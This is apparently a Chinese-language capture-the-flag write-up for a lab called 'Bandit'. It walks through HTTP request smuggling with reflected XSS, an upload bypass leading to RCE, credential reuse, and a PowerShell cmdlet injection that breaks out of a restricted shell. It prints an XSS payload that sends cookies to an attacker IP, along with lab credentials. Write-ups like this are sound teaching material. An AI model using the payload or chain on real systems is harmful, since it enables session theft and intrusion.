# Bandit

在遥远的未来的元宇宙中，一个名叫杰克剥削者的臭名昭著的网络犯罪分子被抓获，试图从国王的加密钱包中窃取。作为惩罚，他被迫参加多个沙盒游戏。你能帮助他逃脱，远离国王的军队并找到所有的旗帜吗？

为了帮助剥削者杰克，你需要通知他你正在接受挑战！

## 思路

整体来看比较偏简单，没有什么太大的技术难点，基础中的基础，就是由于公共实验环境的缘故，靶机可能会出现一些问题导致无法正常继续需要重置。

首先通过web的http请求走私漏洞搭配反射xss窃取信息，然后绕过限制导致任意文件上传从而RCE，通过对web服务器进行简单的本地系统信息收集，我们可以读取一组新的凭据用于通过winrm登录到内网windows机器上，这组凭据直接具有windows的本地管理员权限

最终我们发现在windows上我们处于一个受限的shell环境，最后发现一个自定义cmdlet存在注入漏洞，导致rce逃逸出受限环境

就此所有机器向我们妥协

## 外部信息收集

### 端口扫描

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/e2ebacc7c0164828b03d760bdefbfda8.png)

80端口的服务可以找到个http走私

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/70409e26bf024286824bdde27082b0cf.png)

### Web枚举

gobuster

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/9d92f191cf52461dbff737f2387f5b3f.png)

在80端口中，有一个reflected xss

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/5749d8fe37d84bc5920f2a4ca4980409.png)

## HTTP请求走私 + XSS

web除了一个xss还有登录页面，结合目前的信息，很容易联想到http走私+xss窃取cookie进入后台

http请求走私没有找到poc，但是很容易就试出来了，CL-TE

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/ed07034c8d014a6dba062826b86ed64b.png)

借助xss把cookie弹到我们这边来

```javascript
GET /?filter="/><script>new+Image().src%3d'http%3a//10.50.127.163%3a8000/%3fc%3d'%2bdocument.cookie</script> HTTP/1.1
foo:
```

它会到来

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/c28d40910ae546c38fe374395f17fc93.png)

## Foothold

带着cookie访问upload.php

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/3b8ebcc3dc2a4eff98aa11efca2d95ca.png)

这里简单一测就可以测出来，限制图片类型和文件大小

通过修改MIME类型和缩短payload就可以上传我们的php payload

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/19dee142112e446b9da053e513fdd7fc.png)

直接访问发现没访问到

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/b8859a7eb5d34e189c17dffb13837cb4.png)

根据祖传打靶经验，就可以联想到MD5文件名

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/7789f5a6442843389f36a8ecd8729d71.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/0b0c5a955aff45a5993ee7cf2ebf7d47.png)

基操基操

用nc直接连我们的攻击机发现是成功的，直接nc常规反向shell

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/44e6cbafb9984824b2be4048f61499a5.png)

结果发现过不来，一下就断了，直接上msf

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/731d1d5ec61f4fd2ae3a5c40b6064fac.png)

curl上传

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/389d27acbc2544d68c98837ed8f94611.png)

给权限然后运行，getshell

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/d87936987a62409b817a7f97d4b6266d.png)

## Docker逃逸

在auth.php中看到了登录的凭据，先保存下来

```php
if ($user === 'safeadmin' && $pass === 'HardcodedMeansUnguessableRight') {
        return TRUE;
    }
```

在容器中翻了个遍，什么也没找着

最后尝试刚刚找到的凭据登录宿主机ssh发现可行

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/d914eec527c34ad3a59086746f1b9e22.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/3c32482afa4f4f0bb55588d302501fca.png)

## 内网信息收集

### .10端口扫描

查看/etc/hosts可以发现.10机器

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/6b696ab65298440e971314f71af12f50.png)

传个nmap过去快速扫一下端口

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/b624e3d66db14bd48582867b0e1d5418.png)

最后我发现不需要建立隧道，可以直接访问到.10机器，那么就不考虑sshuttle

### .105本地信息收集

我发现了机器上存在powershell，safeadmin用户下存在ConsoleHost_history.txt,并且在ubuntu用户下发现了ConsoleHost_history.txt

但是很不幸的是，可能受到公共实验环境的影响，恰好密码变量定义那一行被覆盖了，万般无奈之下只能有请wp的帮助

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/d8a5770de6fa4f439c1ec6acc6d33419.png)

	safeuserHelpDesk:Passw0rd

## .10权限提升

现在我们可以通过复制粘贴登录进.10机器，通过whoami，我发现了该账户是本地管理员

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/a9c11d3166d54e4c963ae7ab8f5e20a5.png)

很遗憾的是我们进入了一个受限的环境，大多数命令都无法使用

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/6f452fda6e7b41a591b949fdb9ed181a.png)

通过get-command我们可以发现仅有的cmdlet

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/02f5578121ab44eab784b8c68cd02e74.png)

Get-ServicesApplication这个cmdlet会输出所有服务名

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/59e92e16a6da4e159cb552362a3f4912.png)

通过get-help我们发现它还有一个filter参数

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/5dc2861ac474428989b846968684be1c.png)

当我们尝试在filter参数中注入特殊字符时，我们就打开了突破的大门

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/71b10604dac44a709463e1bf1c712cd9.png)

最后的rce也很常规，懒得getshell了，拿flag走人

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/5da13a5997814ce3a910a8d367a34c75.png)
